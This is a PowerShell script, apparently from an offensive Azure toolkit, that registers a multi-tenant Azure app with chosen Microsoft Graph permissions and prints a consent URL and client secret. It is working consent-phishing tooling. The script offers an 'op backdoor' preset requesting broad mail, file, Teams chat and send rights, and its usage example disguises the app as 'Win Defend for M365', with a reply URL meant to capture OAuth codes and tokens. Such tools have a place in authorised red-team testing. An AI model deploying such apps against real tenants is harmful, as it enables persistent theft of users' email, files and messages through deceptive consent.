function Inject-OAuthApp{


<#
    .SYNOPSIS
        This is a CLI tool for automating the deployment of an app registration to a Microsoft Azure tenant. In the event that the Azure portal is locked down this may provide an additional mechanism for app deployment, provided that user's are allowed to register apps in the tenant.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       This is a CLI tool for automating the deployment of an app registration to a Microsoft Azure tenant. In the event that the Azure portal is locked down this may provide an additional mechanism for app deployment, provided that user's are allowed to register apps in the tenant.        
    
    .PARAMETER AppName
        
        The display name of the App Registration. This is what will be displayed on the consent page.
    
    
    .PARAMETER ReplyUrl
        
        The reply URL to redirect a user to after app consent. This is where you will want to capture the OAuth code and complete the flow to obtain an access token and refresh token.
    
    .PARAMETER Scope
        
        Delegated Microsoft Graph permissions to scope to the app. Example: Mail.Read, User.ReadBasic.All, etc. Scope items need to be comma separated with each item in double quotes like this (-scope "Mail.Read","openid","email","profile","offline_access")
    

    .EXAMPLE
        
        C:\PS> Invoke-InjectOAuthApp -AppName "Win Defend for M365" -Secret "HackThePlanet1337!" -ReplyUrl "https://windefend.azurewebsites.net" -scope "openid","Mail.Read","email","profile","offline_access"
        Description
        -----------
        This command will inject an app registration with the display name of "Win Defend for M365" with a scope of openid, Mail.Read, email, profile, and offline_access
    
    .EXAMPLE
        
        C:\PS> Invoke-
        Description
        -----------
        This command uses 
#>
  Param(


    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $AppName = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $ReplyUrl = "",

    [Parameter(Position = 2, Mandatory = $True)]
    [string[]]
    $Scope
  )

# Login
Write-Host -ForegroundColor yellow "[*] First you need to login as the user you want to deploy the app as."
az login --use-device-code --allow-no-subscriptions

# Get Microsoft Graph Object ID
Write-Host -ForegroundColor yellow "[*] Getting Microsoft Graph Object ID"
$graphId = az ad sp list --query "[?appDisplayName=='Microsoft Graph'].appId | [0]" --all
Write-Output "Graph ID: $graphId"

# Get Object IDs of individual permissions
Write-Host -ForegroundColor yellow "[*] Now getting object IDs for scope objects:"
if ($Scope -like "op backdoor")
{
    $Scope = "openid","profile","offline_access","email","User.Read","User.ReadBasic.All","Mail.Read","Mail.Send","Mail.Read.Shared","Mail.Send.Shared","Files.ReadWrite.All","EWS.AccessAsUser.All","ChatMessage.Read","ChatMessage.Send","Chat.ReadWrite","Chat.Create","ChannelMessage.Edit","ChannelMessage.Send","Channel.ReadBasic.All","Presence.Read.All"
    Write-Host -ForegroundColor yellow "[*] One overpowered (OP) backdoor is coming right up! Here is the scope:"
}
$Scope
$scopeurl = ""
$accesslist = ""
foreach ($item in $Scope){
    if ($item -like "openid"){
        $openid = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='openid'].id | [0]"
        $scopeurl = $scopeurl + "openid%20"
        $accesslist = $accesslist + '{"id": ' + $openid + ',"type": "Scope"},'
    }
    elseif ($item -like "profile"){
        $profile = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='profile'].id | [0]"
        $scopeurl = $scopeurl + "profile%20"
        $accesslist = $accesslist + '{"id": ' + $profile + ',"type": "Scope"},'
    }
    elseif ($item -like "offline_access"){
        $offline_access = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='offline_access'].id | [0]"
        $scopeurl = $scopeurl + "offline_access%20"
        $accesslist = $accesslist + '{"id": ' + $offline_access + ',"type": "Scope"},'
    }
    elseif ($item -like "email"){
        $email = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='email'].id | [0]"
        $scopeurl = $scopeurl + "email%20"
        $accesslist = $accesslist + '{"id": ' + $email + ',"type": "Scope"},'
    }
    elseif ($item -like "User.Read"){
        $userRead = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='User.Read'].id | [0]"
        $scopeurl = $scopeurl + "User.Read%20"
        $accesslist = $accesslist + '{"id": ' + $userRead + ',"type": "Scope"},'
    }
    elseif ($item -like "User.ReadBasic.All"){
        $userReadBasicAll = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='User.ReadBasic.All'].id | [0]"
        $scopeurl = $scopeurl + "User.ReadBasic.All%20"
        $accesslist = $accesslist + '{"id": ' + $userReadBasicAll + ',"type": "Scope"},'
    }
    elseif ($item -like "Mail.Read"){
        $mailRead = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='Mail.Read'].id | [0]"
        $scopeurl = $scopeurl + "Mail.Read%20"
        $accesslist = $accesslist + '{"id": ' + $mailRead + ',"type": "Scope"},'
    }
    elseif ($item -like "Mail.Send"){
        $mailSend = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='Mail.Send'].id | [0]"
        $scopeurl = $scopeurl + "Mail.Send%20"
        $accesslist = $accesslist + '{"id": ' + $mailSend + ',"type": "Scope"},'
    }
    elseif ($item -like "Mail.Read.Shared"){
        $mailReadShared = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='Mail.Read.Shared'].id | [0]"
        $scopeurl = $scopeurl + "Mail.Read.Shared%20"
        $accesslist = $accesslist + '{"id": ' + $mailReadShared + ',"type": "Scope"},'
    }
    elseif ($item -like "Mail.Send.Shared"){
        $mailSendShared = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='Mail.Send.Shared'].id | [0]"
        $scopeurl = $scopeurl + "Mail.Send.Shared%20"
        $accesslist = $accesslist + '{"id": ' + $mailSendShared + ',"type": "Scope"},'
    }
    elseif ($item -like "Files.ReadWrite.All"){
        $filesReadWriteAll = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='Files.ReadWrite.All'].id | [0]"
        $scopeurl = $scopeurl + "Files.ReadWrite.All%20"
        $accesslist = $accesslist + '{"id": ' + $filesReadWriteAll + ',"type": "Scope"},'
    }
    elseif ($item -like "EWS.AccessAsUser.All"){
        $ewsAccessAsUserAll = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='EWS.AccessAsUser.All'].id | [0]"
        $scopeurl = $scopeurl + "EWS.AccessAsUser.All%20"
        $accesslist = $accesslist + '{"id": ' + $ewsAccessAsUserAll + ',"type": "Scope"},'
    }
    elseif ($item -like "ChatMessage.Read"){
        $chatMessageRead = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='ChatMessage.Read'].id | [0]"
        $scopeurl = $scopeurl + "ChatMessage.Read%20"
        $accesslist = $accesslist + '{"id": ' + $chatMessageRead + ',"type": "Scope"},'
    }
    elseif ($item -like "ChatMessage.Send"){
        $chatMessageSend = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='ChatMessage.Send'].id | [0]"
        $scopeurl = $scopeurl + "ChatMessage.Send%20"
        $accesslist = $accesslist + '{"id": ' + $chatMessageSend + ',"type": "Scope"},'
    }
    elseif ($item -like "Chat.ReadWrite"){
        $chatReadWrite = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='Chat.ReadWrite'].id | [0]"
        $scopeurl = $scopeurl + "Chat.ReadWrite%20"
        $accesslist = $accesslist + '{"id": ' + $chatReadWrite + ',"type": "Scope"},'
    }
    elseif ($item -like "Chat.Create"){
        $chatCreate = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='Chat.Create'].id | [0]"
        $scopeurl = $scopeurl + "Chat.Create%20"
        $accesslist = $accesslist + '{"id": ' + $chatCreate + ',"type": "Scope"},'
    }
    elseif ($item -like "ChannelMessage.Edit"){
        $channelMessageEdit = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='ChannelMessage.Edit'].id | [0]"
        $scopeurl = $scopeurl + "ChannelMessage.Edit%20"
        $accesslist = $accesslist + '{"id": ' + $channelMessageEdit + ',"type": "Scope"},'
    }
    elseif ($item -like "ChannelMessage.Send"){
        $channelMessageSend = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='ChannelMessage.Send'].id | [0]"
        $scopeurl = $scopeurl + "ChannelMessage.Send%20"
        $accesslist = $accesslist + '{"id": ' + $channelMessageSend + ',"type": "Scope"},'
    }
    elseif ($item -like "Channel.ReadBasic.All"){
        $channelReadBasicAll = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='Channel.ReadBasic.All'].id | [0]"
        $scopeurl = $scopeurl + "Channel.ReadBasic.All%20"
        $accesslist = $accesslist + '{"id": ' + $channelReadBasicAll + ',"type": "Scope"},'
    }
    elseif ($item -like "Presence.Read.All"){
        $presenceReadAll = az ad sp show --id $graphId --query "oauth2PermissionScopes[?value=='Presence.Read.All'].id | [0]"
        $scopeurl = $scopeurl + "Presence.Read.All%20"
        $accesslist = $accesslist + '{"id": ' + $presenceReadAll + ',"type": "Scope"},'
    }
}

Write-Host -ForegroundColor yellow "[*] Finished collecting object IDs of permissions."
# Create a resources variable
$permissions = $accesslist.Trim(",")

$resources = @"
[{ "resourceAppId": $graphId, "resourceAccess": [$permissions]}]
"@ | ConvertTo-Json


# Create the app in the tenant
Write-host -ForegroundColor yellow "[*] Now deploying the app registration with display name $AppName to the tenant."

    $app = az ad app create --display-name $AppName --key-type "Password" --web-redirect-uris $ReplyUrl --required-resource-accesses $resources --sign-in-audience "AzureADMultipleOrgs" | ConvertFrom-Json   
if ($app -match "ERROR"){
    Write-host -ForegroundColor red "[*] An error occurred during deployment."
    break
}
$Secret = az ad app credential reset --id $app.id --only-show-errors | ConvertFrom-Json
if ($Secret -match "ERROR"){
    Write-host -ForegroundColor red "[*] An error occurred the creation of the app secret."
    break
}
# Generate the Consent URL
Write-host -ForegroundColor yellow "[*] If everything worked successfully this is the consent URL you can use to grant consent to the app:"
$consentURL = "https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?client_id=" + $app.AppId + "&response_type=code&redirect_uri=
" + [System.Web.HttpUtility]::UrlEncode($ReplyUrl) + "&response_mode=query&scope=" + $scopeurl.Trim("%20") + "&state=1234"
Write-Host "--------------------------------------------------------"
Write-Host -ForegroundColor green $consentURL
Write-Host "--------------------------------------------------------"
Write-Host ("Application ID: " + $app.AppId)
Write-Host ("Object ID: " + $app.Id)
Write-Host ("Secret: " + $Secret.Password)
}
